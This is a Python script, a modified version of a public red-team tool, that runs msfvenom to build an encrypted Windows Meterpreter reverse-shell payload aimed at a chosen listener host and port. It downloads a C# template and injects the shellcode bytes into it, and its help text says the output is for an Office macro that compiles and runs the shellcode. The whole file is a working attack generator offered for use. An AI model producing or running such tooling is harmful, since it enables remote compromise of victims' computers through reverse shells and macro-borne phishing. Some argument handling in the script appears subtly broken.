#Modified version of https://github.com/fullmetalcache/CsharpMMNiceness to support msf5 encrypt options and also allows to use a custom SSL ccert.
#example: python mod_nice.py -a x64 -P https -l 127.0.0.1 -p 443 -e aes256 -k test123 -ssl msfkey.pem -s
#xx0hcd

import argparse
import base64
import subprocess
import urllib2
import random
import string
import sys
from itertools import *

tmpNicenessFile = 'tmpshell.txt'
outputFile = 'mmniceness.cs'

def grabCSTemplate():
#leave original path to cs template.
    response = urllib2.urlopen('https://raw.githubusercontent.com/fullmetalcache/CsharpMMNiceness/master/niceness_template.cs')
    script = response.read()

    return script

def injectNiceness(script, nicenessFile, outfile):

    fin = open(nicenessFile)
    niceBytes = []
    for line in fin:
        line = line.rstrip()
        bytes_curr = line.split(", ")
    
        for byte in bytes_curr:
            byte = byte.split(",")[0]
            niceBytes.append(byte)

    fout = open(outfile, 'w')
    scriptLines = script.split("\n")

    for line in scriptLines:
        if '$$$LENGTH$$$' in line:
          line = line.replace('$$$LENGTH$$$', "{0};\n".format(len(niceBytes)))

        elif '$$$NICENESS$$$' in line:
            line = ""

            idx = 0
            for byte in niceBytes:
                fout.write("mmva.Write({0}, ((byte){1}));\n".format(idx, byte))
                idx += 1

        fout.write(line + '\n')

    fout.close()

def createNiceness(arch, protocol, lhost, lport, single, encrypt, key, ssl, outfile):
    #msfCall should be path to msf5 version of msfvenom
    msfCall = 'msfvenom'
    msfPayload = 'windows/'

    if arch == 'x64':
        msfPayload += 'x64/'

    if single == True:
        msfPayload += 'meterpreter_reverse_' + protocol
    else:
        msfPayload += 'meterpreter/reverse_' + protocol
    
    msfLhost = 'lhost=' + lhost
    msfLport = 'lport=' + lport

    msfFormat = "num"
    msfOut = outfile

    msfKey = '--encrypt-key' + key
    msfEncrypt = encrypt + msfKey

    msfSSL = ' HandlerSSLCert=' + ssl + ' StagerVerifySSLCert=true'

    subprocess.check_output([msfCall, '-p', msfPayload, msfLhost, msfLport, msfEncrypt, msfSSL,  '-f', msfFormat, '-o',msfOut])

if __name__== "__main__":
    parser = argparse.ArgumentParser(description='Generate Office Macro that writes, compiles, and runs a C# shell code program')

    parser.add_argument('-a', '--arch', choices=['x86',  'x64'], required=True, help='Target Architecture')
    parser.add_argument('-P', '--protocol', choices=['http', 'https', 'tcp'], required=True, help='Payload protocol')
    parser.add_argument('-l', '--lhost', required=True, help='Listener Host')
    parser.add_argument('-p', '--lport', required=True, help='Listener Port')
    parser.add_argument('-s', '--single', action='store_true', help='Use a single-stage payload')
    parser.add_argument('-e', '--encrypt', choices=['aes256', 'rc4', 'base64', 'xor'], help='Encrypt help msg.')
    parser.add_argument('-k', '--key', help='Enter string for encrypt-key; i.e. test123')
    parser.add_argument('-ssl', help='Enter pem file location for custom SSL')

    args = parser.parse_args()

    createNiceness( args.arch, args.protocol, args.lhost, args.lport, args.single, args.encrypt, args.key, args.ssl, tmpNicenessFile )
    template = grabCSTemplate()
    injectNiceness( template, tmpNicenessFile, outputFile )
